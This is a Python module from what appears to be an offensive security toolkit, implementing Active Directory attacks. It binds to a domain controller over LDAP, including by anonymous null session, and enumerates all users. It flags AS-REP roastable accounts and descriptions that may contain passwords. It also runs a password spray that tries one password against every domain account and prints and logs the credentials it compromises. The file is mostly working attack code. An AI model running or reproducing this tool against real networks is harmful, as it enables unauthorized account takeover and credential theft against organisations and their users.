import os
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from core.ui import draw_header, Q_STYLE
from core.database import db

try:
    from ldap3 import Server, Connection, ALL, NTLM
except ImportError:
    pass  # We handle this gracefully inside the class

console = Console()


class ADEngine:
    def __init__(self):
        self.domain = ""
        self.dc_ip = ""
        self.username = ""
        self.password = ""
        self.conn = None

    def check_dependencies(self):
        try:
            import ldap3
            return True
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'ldap3'[/bold red]")
            console.print(
                "[white]Please run: /opt/davoid/venv/bin/pip install ldap3[/white]")
            return False

    def connect(self):
        self.domain = questionary.text(
            "Target Domain (e.g., corp.local):", style=Q_STYLE).ask()
        if not self.domain:
            return False

        self.dc_ip = questionary.text(
            "Domain Controller IP:", style=Q_STYLE).ask()

        auth_mode = questionary.select(
            "Authentication Mode:",
            choices=[
                "1. Authenticated Bind (Requires User/Pass)",
                "2. Anonymous Bind (Null Session / Misconfigured DC)"
            ],
            style=Q_STYLE
        ).ask()

        if "Authenticated" in auth_mode:
            self.username = questionary.text(
                "Username (e.g., jsmith):", style=Q_STYLE).ask()
            self.password = questionary.password(
                "Password:", style=Q_STYLE).ask()
        else:
            self.username = ""
            self.password = ""

        console.print(f"[*] Attempting to bind to LDAP on {self.dc_ip}...")

        try:
            server = Server(self.dc_ip, get_info=ALL)
            if self.username:
                user_principal = f"{self.domain}\\{self.username}"
                self.conn = Connection(
                    server, user=user_principal, password=self.password, authentication=NTLM, auto_bind=True)
            else:
                self.conn = Connection(server, auto_bind=True)

            console.print(Panel(
                f"[bold green][+] Successfully bound to {self.domain}![/bold green]\n[white]DC Name:[/white] {server.info.server_name}", border_style="green"))
            return True
        except Exception as e:
            console.print(f"[bold red][!] LDAP Bind Failed:[/bold red] {e}")
            return False

    def enum_users(self):
        console.print("[*] Querying Domain Users and Vulnerabilities...")
        # Search base maps corp.local -> DC=corp,DC=local
        search_base = ",".join(
            [f"DC={part}" for part in self.domain.split(".")])

        try:
            # Pulls accounts and looks for the DONT_REQ_PREAUTH flag (4194304)
            self.conn.search(search_base, '(objectClass=user)', attributes=[
                             'sAMAccountName', 'description', 'userAccountControl'])
            users = self.conn.entries

            if not users:
                return console.print("[yellow][!] No users found. The account may lack permissions.[/yellow]")

            table = Table(
                title=f"Domain Users Enumerated ({len(users)})", border_style="cyan")
            table.add_column("Username", style="white")
            table.add_column("Description", style="dim")
            table.add_column("Vulnerability Flag", style="bold red")

            roastable_count = 0

            for user in users:
                name = str(user.sAMAccountName)
                desc = str(user.description) if user.description else ""
                uac = int(
                    user.userAccountControl.value) if user.userAccountControl else 0

                vuln = ""
                # Bitwise check for AS-REP Roastable accounts
                if uac & 4194304:
                    vuln = "AS-REP Roastable!"
                    roastable_count += 1
                    db.log(
                        "AD Engine", name, f"Vulnerable to AS-REP Roasting (No Pre-Auth Required).", "CRITICAL")

                # Heuristic check for lazy IT admins putting passwords in descriptions
                if any(pw_word in desc.lower() for pw_word in ["password", "pass", "pwd", "initial"]):
                    vuln += " (Password in Desc?)"
                    db.log(
                        "AD Engine", name, f"Potential plaintext password in AD description: {desc}", "HIGH")

                table.add_row(name, desc[:40], vuln)

            console.print(table)
            console.print(
                f"[bold green][+] Discovered {roastable_count} AS-REP Roastable accounts.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] Error querying users: {e}[/red]")

    def password_spray(self):
        console.print(
            "[bold red][!] CAUTION: Active Domain Password Spraying[/bold red]")
        console.print(
            "[dim]This tests one password against all users to bypass lockout policies.[/dim]")

        target_pass = questionary.password(
            "Enter Password to Spray:", style=Q_STYLE).ask()
        if not target_pass:
            return

        search_base = ",".join(
            [f"DC={part}" for part in self.domain.split(".")])
        try:
            self.conn.search(search_base, '(objectClass=user)',
                             attributes=['sAMAccountName'])
            users = [str(u.sAMAccountName)
                     for u in self.conn.entries if u.sAMAccountName]
        except Exception as e:
            return console.print(f"[red][!] Could not fetch user list for spraying: {e}[/red]")

        console.print(
            f"[*] Spraying password against {len(users)} domain users...")

        server = Server(self.dc_ip, get_info=ALL)
        successes = []

        with Progress(SpinnerColumn(), TextColumn("{task.description}"), console=console) as progress:
            task = progress.add_task("Spraying...", total=len(users))
            for user in users:
                user_principal = f"{self.domain}\\{user}"
                try:
                    # Attempt an NTLM bind with the sprayed password
                    spray_conn = Connection(
                        server, user=user_principal, password=target_pass, authentication=NTLM)
                    if spray_conn.bind():
                        successes.append(user)
                        console.print(
                            f"[bold green][+] COMPROMISED: {user_principal}:{target_pass}[/bold green]")
                        db.log(
                            "AD Engine", user, f"Password Spray Success: {target_pass}", "CRITICAL")
                        spray_conn.unbind()
                except:
                    pass
                progress.update(task, advance=1)

        if successes:
            console.print(Panel(f"Compromised Accounts:\n" + "\n".join(successes),
                          title="Spray Completed", border_style="green"))
        else:
            console.print(
                "[yellow][-] Spray completed. No valid credentials found.[/yellow]")

    def run(self):
        draw_header("Active Directory Operations")
        if not self.check_dependencies():
            return

        if not self.connect():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        while True:
            choice = questionary.select(
                "AD Operations:",
                choices=[
                    "1. Enumerate Users & Find AS-REP Roastable Accounts",
                    "2. Perform Password Spray (Active Attack)",
                    "Back"
                ],
                style=Q_STYLE
            ).ask()

            if not choice or choice == "Back":
                if self.conn:
                    self.conn.unbind()
                break
            elif "Enumerate" in choice:
                self.enum_users()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            elif "Spray" in choice:
                self.password_spray()
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_ad_ops():
    ADEngine().run()


if __name__ == "__main__":
    run_ad_ops()
